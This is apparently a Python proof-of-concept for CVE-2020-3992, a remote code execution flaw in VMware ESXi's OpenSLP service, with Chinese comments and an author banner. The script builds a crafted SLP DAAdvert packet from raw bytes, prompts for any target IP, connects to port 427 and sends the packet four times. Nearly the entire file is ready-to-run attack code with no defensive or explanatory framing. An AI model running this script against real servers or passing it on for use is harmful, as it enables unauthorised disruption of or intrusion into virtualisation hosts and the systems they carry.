import socket

# 适用于Vmware ESXi = 6.7，ESXi = 6.5，ESXi = 7.0，•	Vmware Cloud Foundation (ESXi) = 3.X，Vmware Cloud Foundation (ESXi) = 4.X
# 说明：CVE-2020-3992
# Vmware ESXI 远程代码执行漏洞

print('''
.__                                             .__   
|  |__  _____     ____    ____    ____    ____  |  |  
|  |  \ \__  \   /    \ _/ ___\  /  _ \  /  _ \ |  |  
|   Y  \ / __ \_|   |  \\  \___ (  <_> )(  <_> )|  |__
|___|  /(____  /|___|  / \___  > \____/  \____/ |____/
     \/      \/      \/      \/   author@hancool
''')
header = b"\x02" + b"\x08" + b"\x00\x00\x49" + b"\x00\x00" + b"\x00\x00\x00" + b"\x00\x00" + b"\x00\x02" + b"\x65\x6e"
daadvert = b"\x00\x00" + b"\x00\x00\x01\x00" + b"\x00\x14" + b"http://www.baidu.com" + b"\x00\x0a" + b"abcdefghij" + b"\x00\x0a" + b"pppppppppp" + b"\x00\x02" + b"bb" + b"\x00"
poc = header + daadvert
tcpClientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Edit your server ip
ipaddr = input("请输入要测试的IP地址：")
serverAddr = (ipaddr, 427)
tcpClientSocket.connect(serverAddr)
print('connect success!')
tcpClientSocket.send(poc)
tcpClientSocket.send(poc)
tcpClientSocket.send(poc)
tcpClientSocket.send(poc)
tcpClientSocket.close()
print('close socket!')
